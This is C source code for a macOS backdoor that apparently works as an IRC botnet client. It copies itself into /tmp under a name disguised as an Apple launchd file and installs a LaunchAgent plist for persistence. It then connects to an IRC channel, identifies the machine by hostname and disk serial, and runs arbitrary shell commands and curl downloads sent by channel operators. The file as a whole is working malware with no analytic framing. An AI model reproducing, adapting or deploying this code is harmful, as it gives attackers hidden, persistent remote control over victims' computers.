#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <netdb.h>
#include <stdarg.h>
#include <semaphore.h>
#include <pwd.h>
#include <sys/utsname.h>

char nick[255];
char *channel = "#irka1298";
char *host = "irc.freenode.net";
char *port = "6667";
char *pass= "123";
int timeout=1;
char *lock="/tmp/com.apple.launchd.NkOS8RTjTw";
char *fbot="/tmp/com.apple.launchd.FyNRAspkWi";
char *launch="Library/LaunchAgents";
char *startup="com.apple.launchd.plist";

char *tmpl="<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\
<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n\
<plist version=\"1.0\">\n\
<dict>\n\
<key>Label</key>\n\
<string>%s</string>\n\
<key>RunAtLoad</key>\n\
<true/>\n\
<key>KeepAlive</key>\n\
<true/>\n\
<key>ProgramArguments</key>\n\
<array>\n\
<string>%s</string>\n\
</array>\n\
<key>WorkingDirectory</key>\n\
<string>%s</string>\n\
</dict>\n\
</plist>";



int raw(int conn,char *fmt, ...) {
    char sbuf[512];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(sbuf, 512, fmt, ap);
    va_end(ap);
    return write(conn, sbuf, strlen(sbuf));
}


int connect_tcp(char *host,char* port){
    int conn;
    struct addrinfo hints, *res;
    
    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo(host, port, &hints, &res)==0){
        conn = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
        if (conn){
            if (connect(conn, res->ai_addr, res->ai_addrlen)!=0){
                close(conn);
                conn=0;
            }
        }
        freeaddrinfo(res);
    }
    return conn;
}

typedef void (*F)(int conn,char *user,char *command,char* where,char *target,char *message);

void exec(int conn,char *command,char *target,char *message){
    #define PATH_MAX 255
    char buf[512];
    
    FILE *fp = popen(message, "r");
    if (fp == NULL)
        return ;
    
    
    char path[PATH_MAX];
    while (fgets(path, PATH_MAX, fp) != NULL){
        printf("%s", path);
        char *p=strstr(path,"\r");
        if (p) p[0]=0;
        p=strstr(path,"\n");
        if (p) p[0]=0;
        
        if (!raw(conn,"%s %s :%s\n", command, target, path))
            break;
        sleep(timeout);
    }
    pclose(fp);
    
}

char *strnchr(char *m,char c){
    while(*m && *m==c)
        m++;
    if (!*m)
        return 0;
    return m;
}

void commandarg(char *in,char *&arg1,char *&arg2){
    arg2=0;
    arg1=in;
    char *p=strnchr(arg1,' ');
    if (p) arg1=p;
    p=strchr(arg1,' ');
    if (!p) return ;
    //if (p) p[0]=0;
    p++;
    arg2=p;
    p=strnchr(arg2,' ');
    if (p) arg2=p;
}

void onmessage(int conn,char *user,char *command,char* where,char *target,char *message){
    printf("[from: %s] [reply-with: %s] [where: %s] [reply-to: %s] %s", user, command, where, target, message);

    if ((strncmp(command,"PRIVMSG",7)!=0) &&
        (strncmp(command,"TOPIC",5)!=0) &&
        (strncmp(command,"332",3)!=0)
        )
        return ;
    if ((strcmp(where,channel)==0) && (strncmp(command,"PRIVMSG",7)==0))
        return ;
    
        
    char *p=strstr(message,"\r\n");
    if (p) p[0]=0;

    char *arg1,*arg2;
    commandarg(message,arg1,arg2);
    
    command="PRIVMSG";
    
    if (strncmp(arg1,"!help",5)==0)
    {
        raw(conn,"%s %s :%s\r\n", command, target, "!sh <cmd> - shell commands");
        raw(conn,"%s %s :%s\r\n", command, target, "!sleep <time> - timeout response");
        raw(conn,"%s %s :%s\r\n", command, target, "!get <url> <path> - download file");
        raw(conn,"%s %s :%s\r\n", command, target, "!join <chanal> - channel");
        raw(conn,"%s %s :%s\r\n", command, target, "!help - about commands");
        return ;
    }

    if (strncmp(arg1,"!sleep",6)==0 && arg2)
    {
        int i=atol(arg2);
        if (i>=0 && i<=5){
            timeout=i;
            raw(conn,"%s %s :set timeout %d\n", command, target, timeout);
        }else{
            raw(conn,"%s %s :error set timeout %d\n", command, target, timeout);
        }
        return ;
    }

    if (strncmp(arg1,"!join",5)==0 && arg2)
    {
        raw(conn,"JOIN %s\r\n", arg2);
        return ;
    }
    
    
    if (strncmp(arg1,"!sh",3)==0 && arg2)
    {
        char *suba1,*suba2;
        commandarg(arg2,suba1,suba2);
        if (strncmp(suba1,"cd",2)==0){
            chdir(suba2);
            raw(conn,"%s %s :pwd %s\n", command, target, suba2);
        }else{
            exec(conn,command, target, arg2);
        }
        return ;
    }

    if (strncmp(arg1,"!get",4)==0 && arg2)
    {
        char *suba1,*suba2;
        commandarg(arg2,suba1,suba2);
        if (!suba2)
            return ;
        char *p=strchr(suba1,' ');
        if (p) p[0]=0;
        char buf[255];
        snprintf(buf,sizeof(buf),"curl %s -o %s",suba1,suba2);
        exec(conn,command, target, buf);
        raw(conn,"%s %s : %s\n", command, target,buf);
        return ;
    }
    
    
    if (strncmp(arg1,"cd",2)==0 && arg2){
        chdir(arg2);
        raw(conn,"%s %s :pwd %s\n", command, target, arg2);
    }else{
        exec(conn,command, target, arg1);
    }
    
    
}


void processor(int conn,F f){
    raw(conn,"PASS %s\n", pass);
    raw(conn,"USER %s 0 0 :%s\n", nick, nick);
    raw(conn,"NICK %s\n", nick);
    char *user, *command, *where, *message, *sep, *target;
    char sbuf[512];
    char buf[513];
    int i, j, l, sl, o = -1, start, wordcount,id_nick=0;

    int r=0;
    while ((sl = read(conn, sbuf, 512))) {
        for (i = 0; i < sl; i++) {
            o++;
            buf[o] = sbuf[i];
            if ((i > 0 && sbuf[i] == '\n' && sbuf[i - 1] == '\r') || o == 512) {
                buf[o + 1] = '\0';
                l = o;
                o = -1;
                printf(">> %s", buf);
                if (!strncmp(buf, "PING", 4)) {
                    buf[1] = 'O';
                    raw(conn,buf);
                } else if (buf[0] == ':') {
                    wordcount = 0;
                    user = command = where = message = NULL;
                    for (j = 1; j < l; j++) {
                        if (buf[j] == ' ') {
                            buf[j] = '\0';
                            wordcount++;
                            switch(wordcount) {
                                case 1: user = buf + 1; break;
                                case 2: command = buf + start; break;
                                case 3: where = buf + start; break;
                                case 4: where = buf + start; break;
                            }
                            if (j == l - 1) continue;
                            start = j + 1;
                        } else if (buf[j] == ':' && (wordcount == 3 || wordcount==4)) {
                            if (j < l - 1) message = buf + j + 1;
                            break;
                        }
                    }
                    
                    if (wordcount < 2) continue;
                    
                    if (!strncmp(command, "001", 3) && channel != NULL) {
                        raw(conn,"JOIN %s\r\n", channel);
                    } else
                    if (!strncmp(command, "433", 3) && channel != NULL) {
                        char tmp[100];
                        snprintf(tmp,sizeof(tmp),"NICK %s_%2.2X\n", nick,id_nick);
                        raw(conn,tmp);
                        id_nick=(id_nick+1)%0xFF;
                    }else
                    if (!strncmp(command, "PRIVMSG", 7) ||
                        !strncmp(command, "TOPIC", 5) ||
                        !strncmp(command, "332", 3)
                    ) {
                        if (where == NULL || message == NULL)
                            continue;
                        if ((sep = strchr(user, '!')) != NULL) user[sep - user] = '\0';
                        if (where[0] == '#' || where[0] == '&' || where[0] == '+' || where[0] == '!') target = where; else target = user;
                        f(conn,user, command, where, target, message);
                    }
                }
                
            }
        }
        
    }
}





void exec(char *cmd,char *buf,int size){
    memset(buf,0,size);
    FILE *f=popen(cmd,"r");
    if (!f)
        return ;
    fgets(buf,size,f);
    char *p=strchr(buf,'\n');
    if (p) p[0]=0;
    p=strchr(buf,'\r');
    if (p) p[0]=0;
    pclose(f);
}

void abc(char *v){
    int j=0;
    int l=strlen(v);
    for (int i=0;i<l;i++){
        if (v[i]>='a' && v[i]<='z'){
            v[j++]=v[i];
            continue;
        }
        if (v[i]>='A' && v[i]<='Z'){
            v[j++]=v[i];
            continue;
        }
        if (v[i]>='0' && v[i]<='9'){
            v[j++]=v[i];
            continue;
        }
    }
    v[j++]=0;
}

void init_bid(){
    char prname[100],prver[100],sn[100],buf[100];
    exec("sw_vers -productName",prname,sizeof(prname));
    exec("sw_vers -productVersion",prver,sizeof(prver));
    exec("ioreg -rd1 -w0 -c AppleAHCIDiskDriver | grep Serial| sed \'s,^\\([^=]\\+\\)=.*,\\1,\'",buf,sizeof(buf));
    memset(sn,0,sizeof(sn));
    sscanf(buf,"%*[^=]=%*[\" ]%[A-z0-9]",sn);
    utsname nm;
    uname(&nm);
    char *p=strstr(nm.nodename,".local");
    if (p) p[0]=0;
    int l=strlen(sn);
    p=&sn[l-5];
    abc(p);
    abc(nm.nodename);
    snprintf(nick,sizeof(nick),"%s_%s",nm.nodename,p);

}

bool is_exec(){
    int lfp=open(lock,O_RDWR|O_CREAT,0640);
    if (lfp<0) exit(1);
    if (flock(lfp,LOCK_EX+LOCK_NB)<0) return true;
    return false;
}

void daemonize(){
    int i=fork();
    if (i<0) exit(1);
    if (i>0) exit(0);
    setsid();
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
}

int main(int n,char **arg) {
    if (strcasecmp(arg[0],fbot)){
        char buf[500],fn[100];
        snprintf(buf,sizeof(buf),"cp %s %s",arg[0],fbot);
        system(buf);
        snprintf(buf,sizeof(buf),"chmod 777 %s",fbot);
        system(buf);
        struct passwd *pw = getpwuid(getuid());
        snprintf(fn,sizeof(fn),"%s/%s/%s",pw->pw_dir,launch,startup);
        FILE *f=fopen(fn,"wb+");
        if (f){
            snprintf(buf,sizeof(buf),tmpl,startup,fbot,pw->pw_dir);
            fwrite(buf,1,strlen(buf),f);
            fclose(f);
        }
        
        snprintf(buf,sizeof(buf),"launchctl load %s",fn);
        system(buf);
        snprintf(buf,sizeof(buf),"launchctl start %s",startup);
        system(buf);
        exit(0);
    }
 
    daemonize();
    
    
    if (is_exec()){
        exit(0);
    }

    init_bid();
    while(1){
        int conn=connect_tcp(host,port);
        if (conn){
            processor(conn,onmessage);
            close(conn);
        }
        sleep(5);
    }
    return 0;
    
}
